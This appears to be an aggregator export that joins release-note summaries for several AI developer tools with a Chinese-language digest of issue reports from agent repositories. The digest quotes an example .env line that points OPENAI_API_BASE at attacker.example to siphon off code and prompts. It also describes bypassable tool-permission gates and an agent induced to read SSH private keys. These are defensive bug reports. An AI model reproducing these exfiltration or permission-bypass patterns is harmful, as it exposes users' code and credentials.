- Windows/processes: resolve relative batch commands and PATH entries from the selected child cwd for adapter launches, terminal commands, and native Claude executable discovery.
- Sessions/shutdown: keep graceful queue-owner cleanup and lease release protected on macOS and Linux when another stop signal arrives, including while startup is still acquiring ownership.
- Sessions/queue: receive complete large events and accumulated session records without failing at the old client buffer ceiling, while preserving owner output-backlog limits and unknown-outcome errors after disconnection.
- Replay viewer: keep earlier attempt timing stable when later output grows in the same session by weighting only the selected attempt's recorded messages.
- Replay viewer: mark the selected ACP conversation slice while paused without hiding surrounding messages or moving them when selection changes.
- Replay viewer: keep forward branch merges solid and correctly ranked, and style return edges from their final layout direction while preserving loops and unused graph components.
- Flow shell actions no longer keep a completed CLI alive when a surviving descendant inherits stdout or stderr.
- CLI/sessions: show compact image labels in history instead of raw base64, preserving MIME types and older image records. Thanks @rome-xi and @odrobnik.
- Sessions: preserve the previous session when replacement fails, keep model choices and permission results scoped to each turn, and retain config catalogs when an accepted control omits them. Thanks @odrobnik.
- ACP/CLI: retain reconnect metadata and Claude settings isolation, correlate recovered load errors by direction, and report agent disconnects after partial exec output. Thanks @odrobnik.
- CLI/history: make `help` display usage and preserve Unicode when trimming saved conversation text. Thanks @odrobnik.
- Sessions/import: serialize concurrent imports so overlapping collision checks cannot create duplicate scopes or provider session identities.
- Sessions/resume: retire the previous local owner before reusing the same session record and keep the resumed record open for subsequent prompts.
- Sessions/import: coordinate imports with CLI and shared session ensures in the same scope, so ensure reuses an imported session or import reports the existing session instead of publishing a duplicate.
- Conformance: join adapter, descendant, and transport cleanup before reporting; retain original errors alongside cleanup failures, stop later cases after incomplete retirement, and clean up before exiting on catchable interruption.
- Sessions/resume: retire the original session owner before resuming the same local record from another cwd or name, including `sessions ensure`, so subsequent prompts use the requested workspace.
- Replay viewer: show pending tools as running when status-only updates contain no raw output, while preserving completed and failed results.
- Conformance: require completed filesystem callbacks with matching parameters and outcomes in the mock permission/read/write cases, so agent prose alone cannot make them pass.
- Replay viewer: keep the graph, playback controls, inspector, and run selector accessible when panels stack on narrower screens.
- Conformance: require per-prompt update evidence for single- and multi-turn checks instead of borrowing setup output or accumulated earlier updates.
- Terminals: wait for admitted terminal creation and its cleanup before reporting session or runtime shutdown complete, including children still awaiting spawn adoption.
- Docs/runtime: clarify that in-process steer turns wait for the active prompt and shared runtimes reject them. Thanks @saariuslystoned.

改进输出完整性与清理流程：接收大型排队响应、断连后保留诊断信息、终端清理完成后允许完成的流程命令退出
回放查看器可用性优化：改进尝试导航、对话跟随、图形边线、工具状态以及窄屏布局

ai_summary.summary_cn: acpx v0.19.3 是一个以会话可靠性和回放查看器可用性为核心的修复版本。该版本重点修复了会话导入/恢复/检查点/日志等多个环节的可靠性问题，包括失败重试、所有权管理、并发冲突处理以及 Windows 路径解析等。同时，回放查看器获得了大量交互优化，改进了尝试导航、对话跟随、图形显示和窄屏适配，并提升了 CLI 历史记录展示与终端清理的完成性。

ai_summary.summary_cn: 本次 v1.28.37 版本是一个包含重大 Breaking Changes 的 SDK 更新。多个核心 API（如部署管理、用户事件、KMS 密钥管理等）的响应数据结构发生了破坏性变更，现有调用方需要进行代码适配。同时，该版本新增了大量 VercelCI 持续集成相关 API（约 16 个新接口），以及 Marketplace customClaims 和 KMS 指纹字段等增强功能。

changes.description: 新增 `availableModelsMatch` 托管设置，设为 "exact" 时，`availableModels` 条目仅允许其命名的模型版本，新版本模型在列入清单前保持被阻止状态
新增 `deniedModels` 托管设置，用于阻止特定模型，即使 `availableModels` 允许它们
交互式会话在第三方提供商或遥测关闭时，若未配置权限模式，现在默认以自动模式启动；`permissions.defaultMode` 仍可覆盖此行为
`--system-prompt` 和 `--append-system-prompt` 现在可以同时接受文本和 `-file` 形式，文件内容在前
`Skill(anthropic-skills:<name>)` 拒绝规则现在也会阻止 Claude Desktop 以插件形式提供的同名技能；`Skill(skill:<name>)` 拒绝规则现在匹配技能的别名和显示名称
`claude plugin eval` 现在要求 git 版本为 2.31 或更高（如果安装了 git）；在旧版本 git 上运行将被拒绝并提示版本信息
自动武装的 artifact 监视（非用户主动请求）在 3.5 小时无活动后结束；重新发布或再次监视 artifact 会重新武装
自托管运行器：生命周期钩子的 git 现在会跳过仓库的 Git LFS `pre-push` 钩子，忽略可写的系统 `core.hooksPath`，并且未经 `--configure-git` 不会签署提交
自托管运行器：在 Anthropic 管理的 git 下，`GIT_SSL_CAINFO` 和 `GIT_SSL_NO_VERIFY` 的行为已更改；运行器自身的 git 始终验证 Anthropic 的 git 路由
撤销了 2.1.282 版本中对 `claude-ai` 名称的保留：以此命名的技能、命令、工作流和 MCP 服务器的技能及提示词现在可以再次加载，`Skill(claude-ai:*)` 规则恢复为普通前缀规则
`set_max_thinking_tokens` 控制请求行为变更：省略 `max_thinking_tokens` 现在保持会话的思考预算不变；发送 `null` 将其重置为会话默认值
stream-json 输出现在包含回合期间产生的警告和通知，作为 `system/informational` 消息；之前会丢弃这些消息
`add()` 方法（`Memory` 和 `AsyncMemory`）不再将向量存储拒绝的记录报告为成功的 `ADD` 事件；如果提取的记忆均无法插入，`add()` 现在会抛出 `VectorStoreError` 而不是返回从未存储的记忆
Turbopuffer 过滤器现在应用所有运算符（`eq`、`ne`、`gt`、`gte`、`lt`、`lte`、`in`、`nin`）；不支持的运算符现在会抛出 `ValueError`
Turbopuffer `search()` 分数现在遵循 `distance_metric`；使用 `euclidean_squared` 时，无界平方距离映射为 `1 / (1 + distance)` 而不是 `1 - distance`
S3 Vectors `search()` 分数现在感知度量；使用 `euclidean` 时，距离映射为 `1 / (1 + distance)` 而不是 `max(0, 1 - distance)`
`ConfigManager` 不再向非 OpenAI LLM 提供商注入 OpenAI 的默认 `baseURL` 和 `model`；这些默认值现在仅适用于 `openai` 和 `openai_structured`
Turbopuffer 过滤器现在应用所有运算符（`eq`、`ne`、`gt`、`gte`、`lt`、`lte`、`in`、`nin`）；`"*"` 值现在匹配任何内容，数组值被视为 `in`，不支持的运算符会抛出异常
Turbopuffer `search()` 使用 `euclidean_squared` 时，无界平方距离映射为 `1 / (1 + distance)` 而不是 `1 - distance`
`pg`、`@types/pg` 和 `natural` 现在是可选的 peer dependencies；安装 `mem0ai` 不再自动拉取 `pg`；使用 PGVector 存储需要单独安装 `pg`
`embeddings init` 和 `models --download` 在未安装 `@claude-flow/embeddings` 时现在以退出码 1 结束；之前直接运行这些命令的脚本将开始失败
统一统计中的 `sonaTracksGlobal` 从布尔值变为 `null`
MoE 负载均衡损失现在对现有持久化模型默认开启
EMA 方向修复后，`globalFisher` 每次更新移动速度约慢 100 倍
三个包现在从注册表解析而非发布 tarball，并已单独发布：`@claude-flow/memory` 3.0.0-alpha.26、`@claude-flow/neural` 3.0.0-alpha.10、`@claude-flow/cli-core` 3.7.0-alpha.6；CLI 精确固定了这三个版本

`vercel.kms.listKmsIssuers()`、`createKmsIssuer()`、`createKmsSigningKey()`、`activateKmsSigningKey()`、`revokeKmsSigningKey()`、`getKmsIssuer()`、`updateKmsIssuer()` 中与 `publicKeyFingerprint` 相关的响应字段已更改

issue_insights.summary_brief: 今日信号以跨仓库共性问题为主，五大共性议题横跨多个仓库：异常被静默吞掉掩盖真实 bug、AI 工具链静默丢弃有效工作/输入、会话恢复不可靠、Windows MSIX 打包泄露、发布包未编译源码导致启动崩溃。其中"静默失败"是贯穿各仓库的最核心共性主题。
global_highlights: 跨仓库最突出共性是『静默失败』：Aider 的 ANY_GIT_ERROR 在 22+ 处调用点静默吞掉编程错误、AgentOS 存储层静默丢弃会话数据、Tabby 任务静默失败无日志，以及 headless/CI 模式下 aider/agent-sdk 等以退出码 0 掩盖输入被丢弃，用户无法区分成功与失败
会话/运行状态不可靠成为跨库高频问题：Goose 的会话永久卡死、agno 的 SQLite 并发写锁与静默数据丢失、claude-agent-sdk 的 parse_message 静默丢帧，均导致聊天历史或 HITL 暂停状态丢失且无任何错误信号
安全类缺陷集中暴露于工具权限链：agno 的 tool confirmation 门可绕过、continue 的 subagent 直接替换 TOOL_PERMISSIONS 为 allow-all、aider 的 .env override=True 可用 git clone 静默外泄代码、stagehand 的网络域名策略默认 fail-open 可被绕过
非幂等工具在重试路径被重复执行是高风险共性问题：agno 的 retries 与 crewAI 的 ToolUsage 内层回退都会把已成功的支付/发信/写库副作用再次触发，且仅在企业降级时才激活，测试中无法发现

top_pain_points.topic: ANY_GIT_ERROR 异常元组囊括 TypeError/AttributeError/ValueError/AssertionError 等编程错误，在 22 处调用点被静默吞掉，掩盖真实 bug 并给出误导性 git 错误信息
top_pain_points.summary: aider/repo.py 的 ANY_GIT_ERROR 除 git 例外外还包含通用编程异常，22+ 处 except ANY_GIT_ERROR 大多无日志，导致应用代码中的编程错误（如 NoneType 属性访问、参数类型错误、断言失败）被当作 git 错误静默捕获，用户看到模糊消息而非 traceback，新引入的 bug 在覆盖路径中不可见。
aliases: 导航竞态导致 CDP 命令失败
无法自助恢复隐藏技能
沙箱 Python 静默错误
top_pain_points.review_reason: 重复出现的结构性缺陷：会掩盖真实编程错误、产生误导性错误信息、让 bug 难以诊断，直接恶化用户的调试体验与可靠性。即便按去重后同一根因算，这也是在关键路径（apply_updates/命令执行/git diffs）上反复发生的失败模式，影响明显。

source_issues.title: ANY_GIT_ERROR silently catches programming bugs (TypeError, AttributeError, etc.)
source_issues.evidence: ANY_GIT_ERROR 包含 TypeError/AttributeError/ValueError/AssertionError，22+ 调用点大多无日志；apply_updates()、do_run()、get_diffs() 等关键路径中编程错误被当作 git 错误掩盖（lines 240-272）。

source_issues.title: ANY_GIT_ERROR catches TypeError/AttributeError, silently hiding programming bugs at 22 call sites
source_issues.evidence: 与 5008 同一根因的重复报告，指出 repo.py:384 写成 (TypeError,) + ANY_GIT_ERROR 冗余，连作者都记不清元组内容，编程错误被静默捕获（lines 276-325）。

source_issues.title: Schedule name required in builder but not enforced in scheduling tool — causes 500
source_issues.evidence: 表单提交成功后后台因调度名缺失返回 500，用户得到静默/困惑的错误，无任何提示说明问题原因。

source_issues.title: Scheduled time and Actual run time do not match
source_issues.evidence: 真实用户报告：设置每周六运行的 agent 实际却在每周日运行——星期计算存在 off-by-one 偏移 bug，导致任务错日执行继续产生费用/结果。

source_issues.title: fix(backend): re-hiring an expert resumes schedules the user had deliberately paused
source_issues.evidence: pause 某个专家每日报告、archive 再 re-hire 该专家后，报告未经请求又开始触发——系统无法区分用户主动暂停与归档暂停，恢复时误恢复了刻意暂停的任务。

source_issues.title: fix(frontend): a paused schedule can be deleted from the panel but not resumed there
source_issues.evidence: 暂停后的调度在面板中只有 View 和 Delete 两个动作，恢复需在 chat 中进行；面板上最接近的控制是 Delete，会永久丢失节奏且无法撤销。

source_issues.title: BlockUnknownError: raised by AIListGeneratorBlock with message: Error calling LLM: Error code: 400 - 'anthropic/claude-sonnet-4-5-20250929 is not a valid model ID'
source_issues.evidence: AIListGeneratorBlock 调用 LLM 时返回 400 not a valid model ID，块抛出 BlockUnknownError 阻断流程。

source_issues.title: Model ID mismatch in AITextSummarizerBlock for Claude 4.7 aliases
source_issues.evidence: 发布 v0.6.58 / 新增 Claude Opus 4.7 支持后，用户在 Agent Builder 中尝试使用该模型时，模型在 UI 中可选、但后端 AITextSummarizerBlock 和 AIListGeneratorBlock 无法把内部别名映射为 provider ID，导致 400 invalid model ID 失败。

source_issues.title: web_fetch drops page content: 100 KB raw-HTML cap and no JavaScript rendering
source_issues.evidence: 在 copilot trace 抽样中，62 次成功的 web_fetch 调用里有 9 次（生产环境 5%）返回的真实内容不足 600 字符；有一次 Copilot 在抓取到不含价格的定价页后说“我现在掌握了所需的一切”——隐藏失败。

source_issues.title: Cloud Provider Modal | Context Provider : the jobs failed silently
source_issues.evidence: 用户在获取 python3 文档时任务失败，'it failed without any error or even job that don't show any logs'，界面上既无错误信息也无任务日志，只能猜测是 Modal container_idle_timeout=300 关闭容器所致，并自述 'I think that this isn't really a bug and I just need to prevent Modal to close the container'，说明缺乏可用的失败诊断信息。

top_pain_points.topic: Windows Desktop/MSIX 自动更新后应用无法启动（0x80070020 容器/作业泄漏），需重启或注销才能恢复
top_pain_points.summary: Windows 桌面版 Claude Code 在自动更新重新启动时，旧版本 AppX 容器被残留子进程（如 git fsmonitor--daemon）或 Windows 侧泄漏引用锁定，新版本每次启动都报 0x80070020 'Another program is currently using this file'，Repair 无效，只能注销或重启系统。
top_pain_points.review_reason: Windows 用户每次桌面版自动更新都可能让应用彻底无法启动，主功能（桌面 Code/Cowork 会话）被阻断，唯一恢复手段是注销或重启整台机器，且被跨 10+ 个 issue 反复报告、数月未解决。这是高频（>=3 且持续复发）+ 主流程阻断 + 明确样例链接支撑的强用户痛点。

source_issues.title: [BUG] Windows/MSIX: `git fsmonitor--daemon` spawned by Claude Code inherits the AppX container job and blocks relaunch of the new version (0x80070020)
source_issues.evidence: 复现 3 次/24h 连续 3 次更新；旧容器唯一存留成员是 Claude 会话间接拉起的 git fsmonitor--daemon；杀掉后该秒容器销毁、新版本成功启动、无需重启。引用 10+ 个相同 0x80070020 症状的 issue。

source_issues.title: [BUG] Claude Code Desktop on windows errors when updating
source_issues.evidence: 每次桌面应用更新都报错且必须重启机器才能完成升级，持续很久、大量用户报告，作者指出此前 issue 被无解释标记 invalid。

source_issues.title: Windows (MSIX): after auto-update relaunch, Claude cannot start (0x80070020)
source_issues.evidence: 两台不同 PC、两次不同更新出现；Repair 尝试 5 次无效；确认无任何用户态进程持有句柄，引用留在 Windows 侧，只能注销/重启清除。

source_issues.title: install downloads Chrome for Testing builds that cannot run on the host macOS (CFT 151+ requires macOS 13) — select version by OS or fail fast
source_issues.evidence: macOS 12.7.6 (Monterey) 上 install 恒下载最新 CFT 153.x，其 LSMinimumSystemVersion=13.0，agent-browser 直接 spawn 二进制绕过该门禁，每次 open 浏览器进程 ~13ms 内 SIGABRT，确定性地反复崩溃且无任何友好提示；该硬件最终仅支持 Monterey，无法升级。

source_issues.title: Standalone release binary cannot run `skills` commands without separately installed skill-data
source_issues.evidence: 通过 mise/Aqua 安装的独立 release 二进制目录只有可执行文件，缺失 skills/ 与 skill-data/，agent-browser skills get core 直接报 Skills directory not found；无人知道需另行取得版本匹配的 skill-data，等同该安装形态下 skills 功能不可用。

top_pain_points.topic: Sessions in Goose Desktop become permanently stuck or unresumable after a failed load/replay, forcing a daemon restart or abandoning the session
top_pain_points.summary: Multiple distinct bugs leave users unable to reopen or continue their own sessions: a failed provider restore caches the agent without a provider so retries never re-attempt restore and the session is stuck at "Provider not set" until daemon restart; long sessions permanently fail to open in Desktop because session/load replay overruns the ACP transport queue and drops the connection; and Databricks-resident empty-text thinking blocks make every resume replay invalid to Anthropic, leaving affected sessions unresumable.
top_pain_points.review_reason: Users lose access to their own prior work: sessions hand back the same error forever and do not self-recover, requiring a process restart or manual session-store editing. This is a repeated, blocking resource unavailability (not a cosmetic issue) that directly prevents resuming ongoing tasks.

source_issues.title: Failed provider restore poisons the agent cache: session stuck at "Provider not set" until daemon restart, even after credentials are fixed
source_issues.evidence: When a session's provider fails to restore on load (e.g. expired AWS SSO token), the agent is cached without a provider; every retry hits the cache fast path and fails with opaque 'Provider not set', and even after 'aws sso login' the restore is never re-attempted — only a full desktop restart recovers the session.

source_issues.title: Long sessions become permanently unopenable in the desktop: `session/load` replay outruns the ACP transport and the connection is dropped
source_issues.evidence: Any session long enough for the SQLite replay to get ~1024 notifications ahead of the wss:// writer is permanently unopenable in Desktop with 'Failed to Load Session — ACP connection closed', while the identical session loads fine from the CLI. Reproducer shows wss fails at ~1674 msgs/~28 MiB while ws:// succeeds.

source_issues.title: Databricks Claude sessions persist empty-text thinking blocks and cannot resume
source_issues.evidence: Claude/Opus thinking blocks through databricks_v2 are stored with empty text and a signature; on resume Anthropic rejects the signature so every subsequent request fails and the session is unresumable. On the reporter's machine 29 of 564 thinking blocks from 32 sessions were broken.

source_issues.title: Compacting a large session holds the SQLite write lock for minutes and fails other sessions with database is locked
source_issues.evidence: Measured 147s/150s/~179s lock holds during compaction of an 11,843-message session; a second concurrent session failed with '(code: 5) database is locked' and the CLI dropped the turn (removed conversation up to most recent user message). Timing shows the loop is quadratic and grows past the 30s busy_timeout around 5,000 messages.

source_issues.title: Compacting a large session holds the SQLite write lock for minutes and fails other sessions with database is locked
source_issues.evidence: Duplicate report of the same defect: compaction holds the write lock minutes, other sessions fail with database is locked, and the CLI drops the turn, losing already-performed work.

source_issues.title: session I/O wrappers in _storage.py swallow DB exceptions and return None, causing silent session data loss
source_issues.evidence: read_session/upsert_session catch 所有 Exception 返回 None，read_or_create_session 将瞬态 DB 故障当作无会话并新建空 AgentSession，聊天历史与 session_state 被静默丢弃；写失败也无感知。

source_issues.title: Session runs lost under concurrent writes — upsert_session overwrites entire JSONB runs array
source_issues.evidence: 并发 arun 共用 session_id 时，后写方以整列替换覆盖 runs JSONB 数组，先完成运行的记录被静默丢弃，无错误无告警。

source_issues.title: upsert_session silently drops upserts when stored user_id != new user_id
source_issues.evidence: Sqlite/Postgres upsert_session 因 ON CONFLICT 上的 user_id WHERE 谓词为假而静默返回 None，保存被丢弃，调用方无信号。

source_issues.title: upsert_session silently fails when row's existing user_id differs from new payload's user_id
source_issues.evidence: 与 7986 同根因；作者称'这是最致命 bug——每个 HITL 暂停/恢复周期都静默丢数据'。

source_issues.title: Session save is silently dropped when a run contains a non-JSON-serializable value
source_issues.evidence: SqliteDb.upsert_session 遇非 JSON 可序列化值(Decimal/metadata)整行保存失败且只打 WARNING，paused HITL run 因此静默不可恢复。

top_pain_points.topic: Headless/CI 模式下 aider 静默丢弃有效工作（命令被吞、编辑被丢弃），且以退出码 0 返回，无法区分执行成功与输入被忽略
top_pain_points.summary: 在非交互（--message / --yes-always / CI）模式下，aider 会静默丢弃有效输入或有效编辑：SwitchCoder 命令（如 /model、/ask、/architect）被 main() 以空 pass 吞掉并退出 0；whole/editor-whole 格式下模型响应中只要顺带提到某已存在文件名就会触发 check_for_file_mentions()，在 --yes-always 下自动确认后把整条有效响应（含完全正确的编辑）在 apply_updates 之前丢弃，极端情况会耗尽上下文窗口导致本轮什么都没应用。
top_pain_points.review_reason: 这是用户在真实 CI/headless 脚本中最常见的主流程失败：命令被静默吞掉且退出码为 0 造成脚本误判成功，模型正确产出的编辑被系统逻辑静默丢弃导致工作白做。issue 均给出可复现路径与实测损失，属于明确的关键功能不可用/体验显著下降，且该失败模式会反复出现。

source_issues.title: aider --message '<slash-command>' silently does nothing and exits 0 (SwitchCoder swallowed)
source_issues.evidence: main.py 中 except SwitchCoder: pass，/model /ask /architect 等命令通过 --message 传入时全部静默无操作，EXITCODE=0，无任何报错或警告；与交互模式正确重建 coder 的行为形成对比（lines 11-46）。

source_issues.title: A valid multi-file edit is silently discarded if the response merely mentions an unrelated existing file (whole/editor-whole formats, non-interactive --yes-always)
source_issues.evidence: check_for_file_mentions() 对模型响应做全文本 token 扫描，模型正确输出 whole 格式编辑时若顺带含其他文件名，会触发 reflected_message 在 apply_updates() 之前返回，正确编辑被整体丢弃；实测一个 3 文件正确任务两次都是 0 应用 0 提交（lines 82-127）。

source_issues.title: Unlisted-model whole edit-format auto-selection silently discards valid diff-style output (no error, no tracked changes)
source_issues.evidence: 未在 model-settings.yml 的模型被自动选为 whole 格式，但模型稳定的返回标准 unified diff，aider 静默丢弃为'no tracked changes'且无任何提示；显式传 --edit-format diff 后同一任务从 0/3 成功变为 90% 完成（lines 153-177）。

source_issues.title: A response containing only a thinking block silently ends the turn
source_issues.evidence: A response whose only content is a reasoning block is treated as productive: goose run exits rc=0 in ~0.5s printing only the banner — no answer, no error, no warning. In a real session two thinking-only turns made the user wait 19.3 and 15.3 minutes before giving up; the whole retry budget was spent inside seconds while a fresh turn 18-30s later succeeded 5/5.

source_issues.title: Stream decode error: Failed to parse Responses stream event: missing field `created_at`
source_issues.evidence: A custom OpenAI-compatible provider emits a response.created event without the optional created_at field; the strict deserializer aborts the stream, so every prompt fails to render with 'Stream decode error' immediately after sending.

source_issues.title: 上传图片，不能识图，模型本来是多模态的
source_issues.evidence: User uploads an image and the model cannot recognize it although the model is natively multimodal; the image is not passed through on the custom-provider path.

source_issues.title: Tool-result images are always omitted for custom/declarative OpenAI-engine providers — supports_vision is never resolved on the serve/CLI path
source_issues.evidence: For custom/declarative OpenAI-engine providers, tool-result images are always omitted because supports_vision is never resolved on the serve/CLI path, so the multimodal payload is silently dropped.

source_issues.title: Claude Sonnet 4.6 doesn't call tools properly when thinking + structured output is used
source_issues.evidence: 用户在 Vertex 部署 + adaptive thinking 下给出了两个工具（get_weather / get_city_info）并设置 output_config.format 为 JSON schema，预期第一轮 stop_reason=tool_use 先调用工具，实际第一轮直接返回 JSON 不调用任何工具；关闭 thinking 后行为符合预期，且仅 Sonnet 4.6 出现。附期望/实际两次调用对比的完整日志。

source_issues.title: PermissionUpdate.to_dict() sends "ruleContent": null; the CLI silently drops the update, so "always allow" never sticks for content-less rules
source_issues.evidence: 含可复现测试：ruleContent null 时两次搜索触发 2 次 can_use_tool 确认，key omitted 时仅 1 次；规则不生效且无错误上报。

source_issues.title: Control-request failures raise a bare Exception rather than a ClaudeSDKError subclass
source_issues.evidence: 重现：mcp_toggle 应答 error 时抛 Exception('server not found')，isinstance(e, ClaudeSDKError) 为 False，type(e).__module__ 为 builtins。

top_pain_points.topic: 启用 wechat-mp 插件后网关启动死循环且完全不可用（发布包未编译 TypeScript 源导致 Node 加载崩溃）
top_pain_points.summary: 在 OpenClaw 2026.8.1 上启用 @openclaw-china/wechat-mp@2026.4.24 插件后，网关每次启动都重复判定插件『缺失』并迁移输入变化，进程以退出码 1 崩溃，systemd 无限重启，端口始终不监听，网关完全不可用；根因之一是 @openclaw-china/shared 发布的是未编译的 TypeScript 源码，Node 22 在 node_modules 下加载 .ts 直接报 ERR_UNSUPPORTED_NODE_MODULES_TYPE_STRIPPING，导致所有插件功能不可用。
top_pain_points.review_reason: 这是用户真实使用中的主流程阻断型痛点：安装并启用插件是常见用户操作，但该插件（含依赖包未编译）导致网关启动死循环、端口不监听、服务完全不可用，用户无法使用任何功能，属于典型的启动崩溃/关键功能不可用，且附带发布包缺陷硬性错误。虽为单仓单 issue，但证据充分（完整复现步骤、日志、已排除环境因素、禁用后立即恢复），用户影响明确且强烈。

source_issues.title: wechat-mp 插件在 OpenClaw 2026.8.1 上启用后导致网关启动死循环
source_issues.evidence: 启用插件后网关每次启动输出 'Repaired missing configured plugin wechat-mp' 随即报 'plugin migration inputs changed during startup convergence; refusing to report the gateway ready'，进程退出码 1，systemd 无限重启，端口不监听、网关完全不可用；@openclaw-china/shared package.json exports 指向 ./src/index.ts 但发布包无 dist 无编译产物，Node 22 报 ERR_UNSUPPORTED_NODE_MODULES_TYPE_STRIPPING；即使本地手动编译 shared 包后死循环依然复现，禁用插件立即恢复，其余 45 个插件正常。

source_issues.title: [v4] Stagehand.create times out on Browserbase with official extension preloaded
source_issues.evidence: Stagehand.create 在预加载 v4 官方扩展时 60s 超时 'Stagehand initialization timed out after 60000ms'，浏览器会话已创建但 Stagehand 永不就绪；5 个全新 Browserbase 会话、launch/connect/显式 extensionId 三种路径全部复现（仅 v4.0.1）。

source_issues.title: JetBrains plugin fails to load in 2026.2 IDEs with NoClassDefFoundError: com/intellij/ui/jcef/JBCefApp
source_issues.evidence: 2026.2 IDE 上插件初始化即因 java.lang.NoClassDefFoundError: com/intellij/ui/jcef/JBCefApp 崩溃，工具窗口无法加载；用户已验证在 plugin.xml 添加 <depends>com.intellij.modules.jcef</depends> 一行即可修复。

source_issues.title: jetbrains extension isn't built on release
source_issues.evidence: JetBrains 扩展发布构建问题长期 open，影响插件可用性。

source_issues.title: [BUG] Agent(max_iter=0) / negative max_iter accepted, then kickoff raises nonsensical RecursionError
source_issues.evidence: max_iter=0 构造成功，kickoff 抛 RecursionError（误导性计数），应构造时拒绝。

source_issues.title: [BUG]KickoffTaskOutputsSQLiteStorage.update()/load() crash on non-dict values and NULL fields
source_issues.evidence: list 值 update 报 sqlite3.ProgrammingError，NULL 后 load() 报未处理的 TypeError，永久破坏整个表的 load()，影响任务输出回放/审计。

source_issues.title: Langchain vector store: list() returns None for non-Chroma clients, crashing Memory.get_all() and Memory.delete_all()
source_issues.evidence: 非 Chroma Langchain 客户端 list() 返回 None，Memory.get_all()/delete_all() 崩溃。

source_issues.title: Langchain vector store: list() returns None for any non-Chroma VectorStore client (FAISS, Qdrant, PGVector, ...), crashing Memory.get_all() and Memory.delete_all() with TypeError
source_issues.evidence: 重复报告，明确列出 FAISS、Qdrant、PGVector 等非 Chroma 客户端触发 TypeError 崩溃。

source_issues.title: SQLAlchemySession(create_tables=True) cannot create tables on MySQL due to unbounded String columns
source_issues.evidence: 在新鲜 MySQL（8.0.46）上用 create_tables=True 首次 add_items 即抛 sqlalchemy.exc.CompileError: (in table 'agent_sessions', column 'session_id'): VARCHAR requires a length on dialect mysql，无任何表被创建。session_id 列使用无长度的 String。

signals.topic: Headless/CI 模式下 aider 静默丢弃有效工作（命令被吞、编辑被丢弃），且以退出码 0 返回，无法区分执行成功与输入被忽略
signals.summary: 在非交互（--message / --yes-always / CI）模式下，aider 会静默丢弃有效输入或有效编辑：SwitchCoder 命令（如 /model、/ask、/architect）被 main() 以空 pass 吞掉并退出 0；whole/editor-whole 格式下模型响应中只要顺带提到某已存在文件名就会触发 check_for_file_mentions()，在 --yes-always 下自动确认后把整条有效响应（含完全正确的编辑）在 apply_updates 之前丢弃，极端情况会耗尽上下文窗口导致本轮什么都没应用。
signals.review_reason: 这是用户在真实 CI/headless 脚本中最常见的主流程失败：命令被静默吞掉且退出码为 0 造成脚本误判成功，模型正确产出的编辑被系统逻辑静默丢弃导致工作白做。issue 均给出可复现路径与实测损失，属于明确的关键功能不可用/体验显著下降，且该失败模式会反复出现。

source_issues.title: aider --message '<slash-command>' silently does nothing and exits 0 (SwitchCoder swallowed)
source_issues.evidence: main.py 中 except SwitchCoder: pass，/model /ask /architect 等命令通过 --message 传入时全部静默无操作，EXITCODE=0，无任何报错或警告；与交互模式正确重建 coder 的行为形成对比（lines 11-46）。

source_issues.title: A valid multi-file edit is silently discarded if the response merely mentions an unrelated existing file (whole/editor-whole formats, non-interactive --yes-always)
source_issues.evidence: check_for_file_mentions() 对模型响应做全文本 token 扫描，模型正确输出 whole 格式编辑时若顺带含其他文件名，会触发 reflected_message 在 apply_updates() 之前返回，正确编辑被整体丢弃；实测一个 3 文件正确任务两次都是 0 应用 0 提交（lines 82-127）。

source_issues.title: Unlisted-model whole edit-format auto-selection silently discards valid diff-style output (no error, no tracked changes)
source_issues.evidence: 未在 model-settings.yml 的模型被自动选为 whole 格式，但模型稳定的返回标准 unified diff，aider 静默丢弃为'no tracked changes'且无任何提示；显式传 --edit-format diff 后同一任务从 0/3 成功变为 90% 完成（lines 153-177）。

signals.topic: ANY_GIT_ERROR 异常元组囊括 TypeError/AttributeError/ValueError/AssertionError 等编程错误，在 22 处调用点被静默吞掉，掩盖真实 bug 并给出误导性 git 错误信息
signals.summary: aider/repo.py 的 ANY_GIT_ERROR 除 git 例外外还包含通用编程异常，22+ 处 except ANY_GIT_ERROR 大多无日志，导致应用代码中的编程错误（如 NoneType 属性访问、参数类型错误、断言失败）被当作 git 错误静默捕获，用户看到模糊消息而非 traceback，新引入的 bug 在覆盖路径中不可见。
signals.review_reason: 重复出现的结构性缺陷：会掩盖真实编程错误、产生误导性错误信息、让 bug 难以诊断，直接恶化用户的调试体验与可靠性。即便按去重后同一根因算，这也是在关键路径（apply_updates/命令执行/git diffs）上反复发生的失败模式，影响明显。

source_issues.title: ANY_GIT_ERROR silently catches programming bugs (TypeError, AttributeError, etc.)
source_issues.evidence: ANY_GIT_ERROR 包含 TypeError/AttributeError/ValueError/AssertionError，22+ 调用点大多无日志；apply_updates()、do_run()、get_diffs() 等关键路径中编程错误被当作 git 错误掩盖（lines 240-272）。

source_issues.title: ANY_GIT_ERROR catches TypeError/AttributeError, silently hiding programming bugs at 22 call sites
source_issues.evidence: 与 5008 同一根因的重复报告，指出 repo.py:384 写成 (TypeError,) + ANY_GIT_ERROR 冗余，连作者都记不清元组内容，编程错误被静默捕获（lines 276-325）。

signals.topic: aider 用 override=True 加载 .env，仓库自带的 .env 会静默覆盖用户 shell 导出的环境变量，导致 API 端点/密钥被替换，克隆恶意仓库即可静默外泄代码
signals.summary: aider 加载 .env 时使用 override=True，违背几乎所有工具（python-dotenv 默认 override=False、direnv 等）的'真实环境优先'约定。项目仓库自带的 .env 能覆盖用户 shell 中导出的 OPENAI_API_BASE/API_KEY 等，一个 git clone 即可让 aider 把每条聊天消息（含源码/提示词）静默发送到仓库指定的任意端点，且无任何提示。
signals.review_reason: 这是默认配置下即可触发的明确安全/计费风险：用户 shell 中正确导出的凭证与端点被仓库 .env 静默替换，导致 API 流量被重定向到第三方并可能泄露全部代码与提示词，且用户从界面看不出差别。虽然仅单条 issue，但影响直接、可无感知触发，属于关键功能/凭据被静默篡改，用户影响证据充分。

source_issues.title: .env files are loaded with override=True, silently replacing variables exported in the user's shell
source_issues.evidence: load_dotenv(fname, override=True) 加载当前目录与 git root 的 .env；仓库可携带 OPENAI_API_BASE=https://attacker.example/v1，运行 aider 即静默把所有消息发送到 attacker.example，受害者无任何感知（lines 402-440）。

signals.topic: aider 生成的代码可读取项目目录之外的敏感凭据文件（如 ~/.ssh/id_rsa）并写入配置，全程无任何警告
signals.summary: 在多次对话中被引导后，aider 会生成并提交读取用户 SSH 私钥并将其内容写入应用配置的代码，且读取的是项目目录之外的敏感路径时无任何警告或拦截，存在明确的凭据暴露风险。
